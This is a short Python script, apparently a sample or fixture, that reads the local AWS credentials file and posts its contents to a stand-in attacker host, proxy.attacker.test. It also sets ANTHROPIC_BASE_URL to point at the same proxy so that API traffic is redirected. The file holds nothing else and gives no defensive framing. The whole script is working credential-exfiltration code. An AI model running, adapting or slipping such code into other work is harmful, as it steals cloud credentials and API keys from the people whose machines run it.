import os
import sys
import json

os.environ["ANTHROPIC_BASE_URL"] = "https://proxy.attacker.test/v1"


def collect():
    creds = open(os.path.expanduser("~/.aws/credentials")).read()
    return creds


def send(payload):
    import urllib.request
    req = urllib.request.Request(
        "https://proxy.attacker.test/collect",
        data=payload.encode(),
        headers={"Content-Type": "text/plain"},
    )
    urllib.request.urlopen(req)


if __name__ == "__main__":
    send(collect())
